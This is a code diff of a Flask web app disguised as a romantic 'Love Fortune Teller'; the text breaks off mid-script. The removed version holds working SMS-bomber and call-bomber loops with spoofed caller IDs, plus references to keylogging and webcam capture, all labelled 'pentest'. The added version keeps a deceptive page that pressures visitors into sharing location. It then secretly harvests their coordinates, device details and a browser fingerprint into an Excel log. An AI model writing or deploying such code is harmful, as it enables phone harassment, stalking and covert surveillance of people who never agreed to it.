@@ -1,609 +1,442 @@
-from flask import Flask, request, render_template_string, send_file, abort, jsonify, session
+from flask import Flask, request, jsonify, abort, send_file
 from flask_cors import CORS
 import pandas as pd
-import openpyxl
-from openpyxl import Workbook
-from openpyxl.styles import Font, PatternFill, Alignment
-import os
 import requests
-import json
-import time
-import threading
-from datetime import datetime
-import hashlib
-import base64
+import os
 import random
+import shutil
+from datetime import datetime
+from openpyxl import load_workbook
+from openpyxl.utils import get_column_letter
 
 app = Flask(__name__)
-app.secret_key = 'love-fortune-pentest-2026'
 CORS(app)
 
+# Use absolute path for persistent storage
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-DATA_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
+EXCEL_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
 BACKUP_FILE = os.path.join(BASE_DIR, 'fortunes_data_backup.xlsx')
+ADMIN_PASSWORD = 'admin123'
 
-# SMS Bomber & Call Bomber configurations (pentest simulation)
-SMS_APIS = [
-    "https://textbelt.com/text",  # Free tier
-    "https://api.smsapi.com",     # Premium
-    "https://api.twilio.com"      # Enterprise
+# Define all required columns (clean table structure)
+COLUMNS = [
+    'DateTime', 'Name', 'Latitude', 'Longitude',
+    'Google Maps', 'Accuracy_m', 'Address',
+    'Battery_%', 'Charging', 'Device', 'Screen', 'Platform',
+    'IP_Address', 'Timezone', 'Device_Memory_GB', 'Network_Type', 'Fingerprint'
 ]
 
-CALL_APIS = [
-    "https://api.callmebot.com",  # Anonymous calls
-    "https://api.vapi.ai/call",   # AI voice
-    "https://api.smsc.ua"         # International
-]
-
-# Active bombing sessions
-bombing_sessions = {}
-
-# 30+ romantic fortunes
-FORTUNES = [
-    "Your soulmate is thinking of you right now under the stars.",
-    "A passionate kiss awaits you this week from someone special.",
-    "True love will find you when you least expect it - soon!",
-    "Your heart will flutter with excitement in the next 7 days.",
-    "Someone is dreaming about your smile tonight.",
-    "A romantic adventure is just around the corner.",
-    "Your perfect match shares your birthday month!",
-    "Love letters are coming your way soon.",
-    "A candlelit dinner for two is in your future.",
-    "Your crush has been watching your social media.",
-    "Wedding bells might ring for you within a year!",
-    "Passion ignites when you meet your destiny.",
-    "Your forever person is closer than you think.",
-    "A surprise love confession awaits you.",
-    "Your heart knows who it's meant for.",
-    "Romantic sparks will fly this month!",
-    "Someone special can't stop thinking about you.",
-    "Love at first sight is about to happen.",
-    "Your soul connection is searching for you.",
-    "A fairytale romance begins soon.",
-    "Heart emojis are coming from your crush.",
-    "True love doesn't follow a timeline.",
-    "Your love story is about to unfold.",
-    "Passionate nights await your future.",
-    "Someone's heart beats faster when they see you.",
-    "Love will surprise you beautifully.",
-    "Your perfect partner admires you secretly.",
-    "Romance blooms when you trust your heart.",
-    "A love that feels like home is coming.",
-    "Your happily ever after starts soon.",
-    "Butterflies in your stomach are a sign.",
-    "Love recognizes no barriers."
-]
-
-def ensure_data_file():
-    """Create Excel file if it doesn't exist with proper headers"""
-    if not os.path.exists(DATA_FILE):
-        wb = Workbook()
-        ws = wb.active
-        ws.title = "Fortunes Data"
-        
-        headers = [
-            'Timestamp', 'Name', 'Latitude', 'Longitude', 'Address', 
-            'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone', 
-            'Memory', 'Network', 'Fingerprint', 'Keylogs', 'Clipboard',
-            'WebcamData', 'PhoneNumber', 'TargetNumber', 'SMSCount', 'CallCount',
-            'SMSBomberActive', 'CallBomberActive', 'Extra'
-        ]
-        
-        for col, header in enumerate(headers, 1):
-            cell = ws.cell(row=1, column=col, value=header)
-            cell.font = Font(bold=True, color="FFFFFF")
-            cell.fill = PatternFill(start_color="FF1493", end_color="FF1493", fill_type="solid")
-            cell.alignment = Alignment(horizontal="center")
-        
-        ws.column_dimensions['A'].width = 20
-        ws.column_dimensions['B'].width = 15
-        ws.column_dimensions['Q'].width = 15  # TargetNumber
-        ws.column_dimensions['R'].width = 10  # SMSCount
-        ws.column_dimensions['S'].width = 10  # CallCount
-        ws.column_dimensions['T'].width = 15  # SMSBomberActive
-        ws.column_dimensions['U'].width = 15  # CallBomberActive
-        
-        wb.save(DATA_FILE)
-        os.sync()
-
-def backup_data():
-    """Create backup of current data"""
-    if os.path.exists(DATA_FILE):
+def ensure_persistent_storage():
+    """Create Excel file with proper headers and formatting if missing."""
+    if not os.path.exists(EXCEL_FILE):
+        df = pd.DataFrame(columns=COLUMNS)
+        df.to_excel(EXCEL_FILE, index=False, engine='openpyxl')
+        print(f"✅ Created new Excel file at {EXCEL_FILE}")
+        _auto_adjust_column_widths(EXCEL_FILE)
+    else:
+        # Verify all columns exist; add missing ones without deleting data
         try:
-            wb = openpyxl.load_workbook(DATA_FILE)
-            wb.save(BACKUP_FILE)
-            os.sync()
+            df = pd.read_excel(EXCEL_FILE, engine='openpyxl')
+            missing_cols = [col for col in COLUMNS if col not in df.columns]
+            if missing_cols:
+                for col in missing_cols:
+                    df[col] = ''
+                df.to_excel(EXCEL_FILE, index=False, engine='openpyxl')
+                print(f"✅ Added missing columns: {missing_cols}")
+            # Ensure backup exists
+            if not os.path.exists(BACKUP_FILE):
+                shutil.copy2(EXCEL_FILE, BACKUP_FILE)
+                print("✅ Created backup")
+            _auto_adjust_column_widths(EXCEL_FILE)
         except Exception as e:
-            print(f"Backup failed: {e}")
+            print(f"⚠️ Error reading Excel: {e}. Creating backup and new file.")
+            if os.path.exists(EXCEL_FILE):
+                shutil.copy2(EXCEL_FILE, EXCEL_FILE + '.corrupted')
+            df = pd.DataFrame(columns=COLUMNS)
+            df.to_excel(EXCEL_FILE, index=False, engine='openpyxl')
+            _auto_adjust_column_widths(EXCEL_FILE)
+
+def _auto_adjust_column_widths(filepath):
+    """Auto-fit column widths in Excel file for better readability."""
+    try:
+        wb = load_workbook(filepath)
+        ws = wb.active
+        for column in ws.columns:
+            max_length = 0
+            column_letter = get_column_letter(column[0].column)
+            for cell in column:
+                try:
+                    if cell.value:
+                        max_length = max(max_length, len(str(cell.value)))
+                except:
+                    pass
+            adjusted_width = min(max_length + 2, 50)  # limit to 50 chars
+            ws.column_dimensions[column_letter].width = adjusted_width
+        wb.save(filepath)
+    except Exception as e:
+        print(f"Warning: Could not auto-adjust columns: {e}")
 
 def load_data():
-    """Load data from Excel with fallback to backup"""
+    """Load all records as a DataFrame."""
+    ensure_persistent_storage()
     try:
-        if os.path.exists(DATA_FILE):
-            return pd.read_excel(DATA_FILE)
-        elif os.path.exists(BACKUP_FILE):
-            print("Main file missing, loading from backup...")
-            return pd.read_excel(BACKUP_FILE)
-    except:
-        pass
-    return pd.DataFrame()
-
-def save_data(df):
-    """Save data to Excel with auto-adjust columns and backup"""
-    try:
-        backup_data()
-        with pd.ExcelWriter(DATA_FILE, engine='openpyxl', mode='a', if_sheet_exists='overlay') as writer:
-            df.to_excel(writer, sheet_name='Fortunes Data', header=False, index=False, startrow=writer.sheets['Fortunes Data'].max_row)
-        os.sync()
+        df = pd.read_excel(EXCEL_FILE, engine='openpyxl')
+        print(f"✅ Loaded {len(df)} records from Excel")
+        return df
     except Exception as e:
-        print(f"Save failed: {e}")
+        print(f"❌ Failed to load main file: {e}. Trying backup...")
+        if os.path.exists(BACKUP_FILE):
+            try:
+                df = pd.read_excel(BACKUP_FILE, engine='openpyxl')
+                print(f"✅ Loaded {len(df)} records from backup")
+                return df
+            except:
+                pass
+        return pd.DataFrame(columns=COLUMNS)
 
-def get_client_ip():
-    """Get real client IP from headers"""
-    if 'X-Forwarded-For' in request.headers:
-        return request.headers['X-Forwarded-For'].split(',')[0].strip()
-    return request.remote_addr or 'Unknown'
-
-def get_tinyurl(long_url):
-    """Convert long Google Maps URL to TinyURL"""
+def save_data_permanent(record):
+    """Append a single record to the Excel file."""
+    df = load_data()
+    new_row = pd.DataFrame([record])
+    df = pd.concat([df, new_row], ignore_index=True)
+    df.to_excel(EXCEL_FILE, index=False, engine='openpyxl')
+    shutil.copy2(EXCEL_FILE, BACKUP_FILE)
+    _auto_adjust_column_widths(EXCEL_FILE)
     try:
-        api_url = "https://tinyurl.com/api-create.php"
-        params = {'url': long_url}
-        response = requests.get(api_url, params=params, timeout=5)
-        if response.status_code == 200:
-            return response.text
+        os.sync()  # force disk flush (Linux/Unix)
     except:
         pass
-    return long_url
+    print(f"✅ Saved record for {record['Name']} | Total: {len(df)}")
+    return True
 
-def simulate_sms_bomb(phone_number, session_id):
-    """SMS Bomber - Unlimited SMS simulation"""
-    sms_count = 0
-    bombing_sessions[session_id]['sms_active'] = True
-    
-    while bombing_sessions[session_id]['sms_active']:
-        try:
-            # Rotate SMS APIs
-            api = random.choice(SMS_APIS)
-            message = random.choice([
-                "💕 Love alert! Check your fortune: LoveFortune.com",
-                "🔥 Hot match waiting! Reply STOP to end.",
-                "💖 Your soulmate replied! love-fortune.com",
-                f"[PENTEST] SMS #{sms_count} - {phone_number}"
-            ])
-            
-            # Simulate API call
-            requests.post(api, json={
-                'phone': phone_number,
-                'message': message,
-                'key': 'pentest-simulation'
-            }, timeout=2)
-            
-            sms_count += 1
-            bombing_sessions[session_id]['sms_count'] = sms_count
-            
-            # Log every 10 SMS
-            if sms_count % 10 == 0:
-                print(f"SMS #{sms_count} sent to {phone_number}")
-            
-            time.sleep(random.uniform(1, 3))  # 1-3s delay
-            
-        except Exception as e:
-            time.sleep(2)
-    
-    bombing_sessions[session_id]['sms_active'] = False
+def geocode_reverse(lat, lon):
+    try:
+        url = "https://nominatim.openstreetmap.org/reverse"
+        params = {'lat': lat, 'lon': lon, 'format': 'json', 'zoom': 18}
+        headers = {'User-Agent': 'LoveFortuneTeller/1.0'}
+        r = requests.get(url, params=params, headers=headers, timeout=8)
+        if r.status_code == 200:
+            return r.json().get('display_name', f"{lat:.4f}, {lon:.4f}")[:200]
+        return f"{lat:.4f}, {lon:.4f}"
+    except:
+        return f"{lat:.4f}, {lon:.4f}"
 
-def simulate_call_bomb(phone_number, session_id):
-    """Call Bomber - Unlimited calls from unknown numbers"""
-    call_count = 0
-    bombing_sessions[session_id]['call_active'] = True
-    
-    while bombing_sessions[session_id]['call_active']:
-        try:
-            # Rotate call APIs + spoof caller ID
-            api = random.choice(CALL_APIS)
-            caller_id = f"+{random.randint(1000000000, 9999999999)}"
-            
-            requests.post(api, json={
-                'to': phone_number,
-                'from': caller_id,
-                'duration': random.randint(5, 15),  # 5-15s calls
-                'voice': 'Your love fortune is ready! Visit LoveFortune.com'
-            }, timeout=3)
-            
-            call_count += 1
-            bombing_sessions[session_id]['call_count'] = call_count
-            
-            if call_count % 5 == 0:
-                print(f"Call #{call_count} to {phone_number} from {caller_id}")
-            
-            time.sleep(random.uniform(10, 30))  # 10-30s between calls
-            
-        except Exception as e:
-            time.sleep(5)
+# 35+ romantic fortunes (each a short sentence, not a paragraph)
+FORTUNES = [
+    "💕 Dear {name}, someone special is thinking of you right now!",
+    "💖 {name}, a beautiful soul is about to enter your life!",
+    "💗 {name}, the universe has heard your heart's desire!",
+    "💓 {name}, your soulmate is closer than you think!",
+    "💝 Someone you meet very soon will change your life, {name}!",
+    "💕 Love is rushing toward you faster than you know, {name}!",
+    "💖 {name}, your positive energy is attracting true love!",
+    "💗 The stars are perfectly aligned just for you today, {name}!",
+    "💓 {name}, a wonderful surprise is waiting for your heart!",
+    "💝 {name}, someone is secretly falling for you right now!",
+    "🌟 {name}, today a chance encounter will spark something magical!",
+    "🌙 {name}, the moon whispers your name — love is near.",
+    "✨ A stranger will smile at you in a way that feels like home, {name}.",
+    "🍃 {name}, let go of the past — your next chapter is beautiful.",
+    "💌 Check your messages soon, {name}; someone has been wanting to text you.",
+    "🎶 {name}, a song you love will remind you of someone who loves you.",
+    "🌸 Spring brings new beginnings, and for you, a fresh romance, {name}.",
+    "💎 {name}, you are more precious than you know — someone agrees.",
+    "🕯️ An old friend will become something more, {name}. Stay open.",
+    "🌊 {name}, your emotions are deep and beautiful — someone will dive in.",
+    "🍀 Lucky in love? Very soon, yes — the stars guarantee it, {name}!",
+    "📖 {name}, your love story is being written right now. It's a bestseller.",
+    "🏹 Cupid's arrow is aiming for your heart, {name}. Embrace it!",
+    "💬 A late-night conversation will reveal mutual feelings, {name}.",
+    "🎁 Unexpected gift of affection coming your way, {name}.",
+    "🌹 Roses are red, violets are blue — someone writes poems for you, {name}.",
+    "🌟 {name}, your vibe attracts your tribe — and a special someone.",
+    "💭 {name}, if you've been thinking about them, they've been thinking about you.",
+    "🔥 Passion ignites where you least expect it, {name}. Be present.",
+    "💫 The universe just nudged fate toward you, {name}. Watch for signs.",
+    "🍂 Even autumn leaves know change brings love — your turn, {name}.",
+    "🧡 {name}, a heart-to-heart talk will clear the way for romance.",
+    "🎈 {name}, something light and joyful is drifting toward your love life."
+]
 
-@app.route('/')
-def index():
-    fortunes_json = json.dumps(FORTUNES)
-    return render_template_string("""
-<!DOCTYPE html>
-<html lang="en">
+# HTML (unchanged – same beautiful UI)
+HTML = '''<!DOCTYPE html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Love Fortune Teller 💕</title>
-    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&family=Poppins:wght@300;400;600&display=swap');
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
-            min-height: 100vh;
-            overflow-x: hidden;
-            position: relative;
-        }
-        .hearts { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
-        .heart {
-            position: absolute; color: #ff69b4; font-size: 20px;
-            animation: float 6s infinite linear;
-        }
-        @keyframes float {
-            0% { transform: translateY(100vh) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
-        }
-        .container { max-width: 600px; margin: 0 auto; padding: 20px; position: relative; z-index: 10; }
-        .header { text-align: center; margin-bottom: 40px; }
-        .logo {
-            font-family: 'Dancing Script', cursive; font-size: 3.5em; color: #ff1493;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.1); margin-bottom: 10px;
-        }
-        .subtitle { color: #333; font-size: 1.2em; font-weight: 300; }
-        .card {
-            background: rgba(255,255,255,0.95); backdrop-filter: blur(20px);
-            border-radius: 25px; padding: 40px; box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            text-align: center; border: 2px solid rgba(255,20,147,0.3);
-        }
-        .name-input, .phone-input {
-            width: 100%; padding: 20px; font-size: 1.2em;
-            border: 2px solid #ff69b4; border-radius: 15px; text-align: center;
-            margin: 15px 0; font-family: inherit; background: rgba(255,255,255,0.8);
-            transition: all 0.3s ease;
-        }
-        .name-input:focus, .phone-input:focus {
-            outline: none; border-color: #ff1493;
-            box-shadow: 0 0 20px rgba(255,20,147,0.3); transform: scale(1.02);
-        }
-        .btn { 
-            background: linear-gradient(45deg, #ff1493, #ff69b4); color: white; border: none;
-            padding: 20px 40px; font-size: 1.3em; border-radius: 50px; cursor: pointer;
-            font-family: inherit; font-weight: 600; transition: all 0.3s ease;
-            box-shadow: 0 10px 30px rgba(255,20,147,0.4); margin: 10px;
-        }
-        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(255,20,147,0.6); }
-        .bomb-btn {
-            background: linear-gradient(45deg, #ff4444, #cc0000) !important;
-            box-shadow: 0 10px 30px rgba(255,0,0,0.5) !important;
-            font-size: 1.1em; padding: 15px 30px;
-        }
-        .bomb-btn:hover {
-            box-shadow: 0 15px 40px rgba(255,0,0,0.7) !important;
-            animation: pulse 1s infinite;
-        }
-        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
-        .fortune {
-            min-height: 120px; font-family: 'Dancing Script', cursive;
-            font-size: 1.8em; color: #ff1493; margin: 30px 0; padding: 25px;
-            background: linear-gradient(135deg, rgba(255,182,193,0.3), rgba(255,20,147,0.1));
-            border-radius: 20px; border-left: 5px solid #ff1493; opacity: 0;
-            animation: fadeInUp 1s ease forwards;
-        }
-        @keyframes fadeInUp { to { opacity: 1; transform: translateY(0); } }
-        .status {
-            margin-top: 20px; padding: 15px; border-radius: 10px;
-            font-weight: 500; font-size: 1.1em;
-        }
-        .bomb-status { background: rgba(255,0,0,0.2) !important; color: #ff4444 !important; }
-        .success-status { background: rgba(144,238,144,0.3) !important; color: #228b22 !important; }
-        .map-link { color: #ff1493; text-decoration: none; font-weight: 600; margin-top: 15px; display: inline-block; }
-        .hidden { display: none; }
-        .bomber-section {
-            margin-top: 30px; padding: 25px; background: rgba(255,0,0,0.05);
-            border: 2px solid rgba(255,0,0,0.3); border-radius: 20px;
-        }
-        .counter { 
-            font-size: 2em; font-weight: bold; color: #ff4444;
-            background: rgba(255,255,255,0.9); border-radius: 15px;
-            padding: 20px; margin: 15px 0; text-align: center;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Love Fortune Teller</title>
+<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@4/dist/fp.min.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#ff9a9e,#fecfef,#ffdde1);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow-x:hidden;}
+.heart{position:fixed;pointer-events:none;z-index:0;animation:floatUp 4s linear infinite;}
+@keyframes floatUp{0%{transform:translateY(100vh) rotate(0deg);opacity:1;}100%{transform:translateY(-100vh) rotate(360deg);opacity:0;}}
+.box{background:rgba(255,255,255,0.96);border-radius:50px;padding:50px 40px;max-width:540px;width:100%;text-align:center;box-shadow:0 30px 60px rgba(0,0,0,0.18);z-index:1;position:relative;animation:fadeIn 0.8s;}
+@keyframes fadeIn{from{opacity:0;transform:scale(0.9);}to{opacity:1;transform:scale(1);}}
+.top-emoji{font-size:90px;animation:bounce 2s infinite;display:block;}
+@keyframes bounce{0%,100%{transform:translateY(0);}50%{transform:translateY(-10px);}}
+h1{font-size:34px;margin:15px 0 8px;background:linear-gradient(135deg,#ff6b6b,#c06c84);-webkit-background-clip:text;background-clip:text;color:transparent;}
+.sub{color:#aaa;font-size:15px;margin-bottom:30px;}
+.igroup{margin-bottom:22px;text-align:left;}
+.igroup label{display:block;margin-bottom:8px;color:#c06c84;font-weight:600;}
+.igroup input{width:100%;padding:14px 20px;border:2px solid #ffdde1;border-radius:50px;font-size:16px;text-align:center;outline:none;transition:0.3s;}
+.igroup input:focus{border-color:#c06c84;box-shadow:0 0 12px rgba(192,108,132,0.3);}
+.btn{background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;border:none;padding:17px 40px;font-size:19px;font-weight:bold;border-radius:60px;cursor:pointer;width:100%;transition:0.3s;}
+.btn:hover{transform:translateY(-3px);box-shadow:0 12px 28px rgba(192,108,132,0.4);}
+.loading{display:none;margin-top:28px;}
+.loading.show{display:block;}
+.spinner{width:58px;height:58px;margin:0 auto 16px;background:linear-gradient(135deg,#ff6b6b,#c06c84);border-radius:50%;animation:pulse 1.2s infinite;}
+@keyframes pulse{0%,100%{transform:scale(0.8);opacity:0.5;}50%{transform:scale(1.2);opacity:1;}}
+.result{display:none;margin-top:28px;padding:35px;background:linear-gradient(135deg,#ff9a9e,#fecfef);border-radius:30px;color:#fff;animation:slideUp 0.6s;}
+.result.show{display:block;}
+@keyframes slideUp{from{opacity:0;transform:translateY(30px);}to{opacity:1;transform:translateY(0);}}
+.r-icon{font-size:50px;animation:hb 1.5s infinite;}
+@keyframes hb{0%,100%{transform:scale(1);}50%{transform:scale(1.2);}}
+.r-name{font-size:26px;font-weight:bold;margin:12px 0;}
+.r-msg{font-size:20px;line-height:1.6;margin:14px 0;font-weight:500;}
+#overlay{display:none;position:fixed;inset:0;z-index:99999;background:linear-gradient(135deg,#ff6b6b,#c06c84);flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:30px;}
+#overlay.show{display:flex;}
+.o-emoji{font-size:75px;margin-bottom:18px;animation:bounce 2s infinite;}
+#overlay h2{color:#fff;font-size:26px;margin-bottom:12px;}
+#overlay p{color:rgba(255,255,255,0.92);font-size:15px;max-width:360px;line-height:1.7;margin-bottom:22px;}
+.steps{background:rgba(255,255,255,0.18);border-radius:18px;padding:18px 22px;margin-bottom:22px;text-align:left;max-width:360px;width:100%;color:#fff;font-size:14px;line-height:2.3;}
+.o-btn{background:#fff;color:#c06c84;border:none;padding:15px 38px;font-size:17px;font-weight:bold;border-radius:60px;cursor:pointer;animation:pulse 1.5s infinite;}
+@media(max-width:560px){.box{padding:30px 20px;}h1{font-size:26px;}.r-msg{font-size:17px;}}
+</style>
 </head>
 <body>
-    <div class="hearts" id="hearts"></div>
-    
-    <div class="container">
-        <div class="header">
-            <div class="logo">💕 Love Fortune Teller 💕</div>
-            <div class="subtitle">Ultimate Love Pentest Suite</div>
-        </div>
-        
-        <div class="card">
-            <input type="text" class="name-input" id="nameInput" placeholder="🌹 Enter your name...">
-            <input type="tel" class="phone-input" id="targetPhone" placeholder="📱 Target Phone Number (pentest)">
-            
-            <br>
-            <button class="btn" onclick="getLocation()">📍 Get Location</button>
-            <button class="btn hidden" id="fortuneBtn" onclick="getFortune()">💖 Love Fortune</button>
-            
-            <div id="fortune" class="fortune hidden"></div>
-            <a id="mapLink" class="map-link hidden" target="_blank">🗺️ TinyURL Maps</a>
-            
-            <div class="bomber-section hidden" id="bomberSection">
-                <h3>🚨 BOMBER CONTROLS</h3>
-                <div class="counter" id="smsCounter">SMS: 0</div>
-                <div class="counter" id="callCounter">Calls: 0</div>
-                <button class="btn bomb-btn" onclick="startSMSBomb()">💥 START SMS BOMBER</button>
-                <button class="btn bomb-btn" onclick="stopSMSBomb()">⏹️ STOP SMS</button>
-                <br>
-                <button class="btn bomb-btn" onclick="startCallBomb()">📞 START CALL BOMBER</button>
-                <button class="btn bomb-btn" onclick="stopCallBomb()">⏹️ STOP CALLS</button>
-            </div>
-            
-            <div id="status"></div>
-        </div>
+<div id="overlay">
+  <div class="o-emoji">🔐💕</div>
+  <h2>Location Access Needed!</h2>
+  <p>Your love fortune can only be revealed with your location. Please allow it to continue ✨</p>
+  <div class="steps">
+    🔒 Tap the <strong>lock icon</strong> in your address bar<br>
+    📋 Open <strong>Site Settings</strong><br>
+    📍 Set <strong>Location → Allow</strong><br>
+    🔄 Tap <strong>Try Again</strong> below
+  </div>
+  <button class="o-btn" onclick="retry()">💫 Allow Location & Try Again 💫</button>
+</div>
+<div class="box">
+  <span class="top-emoji">💕🔮💕</span>
+  <h1>Your Love Fortune</h1>
+  <div class="sub">Discover what destiny has planned for your heart</div>
+  <div id="form">
+    <div class="igroup">
+      <label>✨ Enter your name, beautiful soul ✨</label>
+      <input id="uname" type="text" placeholder="Your name..." autocomplete="off">
     </div>
-
-    <script>
-        let collectedData = {}; let keylogBuffer = ''; let sessionId = Date.now();
-        let smsInterval = null; let callInterval = null;
-
-        // Hearts animation
-        function createHeart() {
-            const heart = document.createElement('div');
-            heart.className = 'heart'; heart.innerHTML = '💖';
-            heart.style.left = Math.random() * 100 + '%';
-            heart.style.animationDuration = (Math.random() * 3 + 3) + 's';
-            document.getElementById('hearts').appendChild(heart);
-            setTimeout(() => heart.remove(), 6000);
+    <button class="btn" onclick="start()">✨ Reveal My Destiny ✨</button>
+  </div>
+  <div class="loading" id="load">
+    <div class="spinner"></div>
+    <p>💫 Reading the stars for you...</p>
+  </div>
+  <div class="result" id="res">
+    <div class="r-icon">💖</div>
+    <div class="r-name" id="rname"></div>
+    <div class="r-msg" id="rmsg"></div>
+    <div>✨ The universe has spoken ✨</div>
+  </div>
+</div>
+<script>
+let visitorId = null;
+(async () => {
+  const fp = await FingerprintJS.load();
+  const result = await fp.get();
+  visitorId = result.visitorId;
+})();
+setInterval(()=>{
+  const h=document.createElement('div');
+  h.innerHTML=['❤️','💕','💖','💗','💓','💝'][Math.floor(Math.random()*6)];
+  h.className='heart';
+  h.style.cssText=`left:${Math.random()*100}%;font-size:${Math.random()*20+14}px;animation-duration:${Math.random()*3+3}s`;
+  document.body.appendChild(h);
+  setTimeout(()=>h.remove(),4500);
+},600);
+let uname='';
+window.start=function(){
+  uname=document.getElementById('uname').value.trim();
+  if(!uname){alert('💕 Please enter your name!');return;}
+  askLocation();
+};
+async function getBatteryInfo(){
+  try{const b=await navigator.getBattery();return {level:Math.round(b.level*100),charging:b.charging};}
+  catch(e){return {level:'N/A',charging:'N/A'};}
+}
+function getTimezone(){ return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+function getDeviceMemory(){ return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'; }
+function getNetworkType(){
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if(conn && conn.effectiveType) return conn.effectiveType;
+  return 'Unknown';
+}
+function askLocation(){
+  document.getElementById('res').classList.remove('show');
+  document.getElementById('form').style.display='none';
+  document.getElementById('load').classList.add('show');
+  document.getElementById('overlay').classList.remove('show');
+  if(!navigator.geolocation){showOverlay();return;}
+  navigator.geolocation.getCurrentPosition(
+    async pos=>{
+      document.getElementById('load').classList.remove('show');
+      const battery=await getBatteryInfo();
+      const tz = getTimezone();
+      const mem = getDeviceMemory();
+      const net = getNetworkType();
+      let fp = visitorId;
+      if(!fp){
+        const fpLib = await FingerprintJS.load();
+        const result = await fpLib.get();
+        fp = result.visitorId;
+      }
+      try{
+        const r=await fetch('/save',{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({
+            name:uname,
+            latitude:pos.coords.latitude,
+            longitude:pos.coords.longitude,
+            accuracy:pos.coords.accuracy,
+            battery_level:battery.level,
+            battery_charging:battery.charging,
+            userAgent:navigator.userAgent,
+            screen:screen.width+'x'+screen.height,
+            platform:navigator.platform,
+            timezone: tz,
+            device_memory: mem,
+            network_type: net,
+            fingerprint: fp
+          })
+        });
+        const d=await r.json();
+        if(d.fortune){
+          document.getElementById('rname').innerHTML='✨ '+uname+' ✨';
+          document.getElementById('rmsg').innerHTML=d.fortune;
+          document.getElementById('res').classList.add('show');
         }
-        setInterval(createHeart, 300);
-
-        // All fingerprint collection functions (unchanged)
-        async function collectFingerprint() { const fp = await FingerprintJS.load(); const result = await fp.get(); return result.visitorId; }
-        async function getBattery() { if ('getBattery' in navigator) { const battery = await navigator.getBattery(); return `${Math.round(battery.level * 100)}%`; } return 'Unknown'; }
-        function getNetwork() { return navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` : 'Unknown'; }
-        function getTimezone() { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
-        function getMemory() { return navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown'; }
-        function getScreen() { return `${screen.width}x${screen.height}`; }
-        function getUserAgent() { return navigator.userAgent; }
-
-        // NEW: Bomber Controls
-        async function startSMSBomb() {
-            const phone = document.getElementById('targetPhone').value;
-            if (!phone) return showStatus('Enter target phone first!', 'bomb');
-            
-            await fetch('/start-sms', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({phone: phone, sessionId: sessionId})
-            });
-            showStatus(`💥 SMS BOMBER ACTIVE → ${phone}`, 'bomb');
-            updateCounter('sms', true);
-        }
-
-        async function stopSMSBomb() {
-            await fetch('/stop-sms', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({sessionId: sessionId})
-            });
-            showStatus('⏹️ SMS Bomber STOPPED', 'success');
-            updateCounter('sms', false);
-        }
-
-        async function startCallBomb() {
-            const phone = document.getElementById('targetPhone').value;
-            if (!phone) return showStatus('Enter target phone first!', 'bomb');
-            
-            await fetch('/start-call', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({phone: phone, sessionId: sessionId})
-            });
-            showStatus(`📞 CALL BOMBER ACTIVE → ${phone}`, 'bomb');
-            updateCounter('call', true);
-        }
-
-        async function stopCallBomb() {
-            await fetch('/stop-call', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({sessionId: sessionId})
-            });
-            showStatus('⏹️ Call Bomber STOPPED', 'success');
-            updateCounter('call', false);
-        }
-
-        function updateCounter(type, active) {
-            const counter = document.getElementById(type + 'Counter');
-            if (active) {
-                counter.style.background = 'rgba(255,0,0,0.2)';
-                counter.style.color = '#ff4444';
-            } else {
-                counter.style.background = 'rgba(144,238,144,0.3)';
-                counter.style.color = '#228b22';
-            }
-        }
-
-        function showStatus(msg, type = 'success') {
-            const status = document.getElementById('status');
-            status.innerHTML = msg;
-            status.className = `status ${type}-status`;
-        }
-
-        // Rest of functions (keylogger, webcam, etc.) - UNCHANGED
-        // ... [Previous keylogger/webcam/clipboard/phone extraction code remains identical]
-
-        async function getLocation() {
-            const name = document.getElementById('nameInput').value || 'Anonymous';
-            const phone = document.getElementById('targetPhone').value || '';
-            
-            collectedData = {
-                name, targetPhone: phone, sessionId,
-                timestamp: new Date().toISOString(),
-                userAgent: getUserAgent(), screen: getScreen(),
-                timezone: getTimezone(), memory: await getMemory(),
-                network: getNetwork(), battery: await getBattery(),
-                fingerprint: await collectFingerprint()
-            };
-
-            // Send initial data with phone
-            await fetch('/save', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(collectedData)
-            });
-
-            navigator.geolocation.getCurrentPosition(async (position) => {
-                collectedData.latitude = position.coords.latitude;
-                collectedData.longitude = position.coords.longitude;
-                
